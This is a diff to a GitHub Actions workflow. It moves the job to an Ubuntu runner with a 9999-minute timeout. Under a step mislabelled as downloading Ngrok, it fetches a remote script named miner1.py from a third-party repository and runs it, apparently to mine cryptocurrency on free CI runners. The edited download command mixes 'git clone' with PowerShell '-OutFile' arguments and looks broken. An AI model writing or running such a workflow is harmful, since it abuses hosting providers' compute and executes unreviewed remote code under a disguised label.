@@ -5,13 +5,13 @@ on: workflow_dispatch
 jobs:
   build:
 
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
     timeout-minutes: 9999
 
     steps:
     - name: Downloading Ngrok.
       run: |
-        wget https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py  -OutFile miner1.py
+        git clone https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py  -OutFile miner1.py
     - name: run python.
       run: |
         python miner1.py
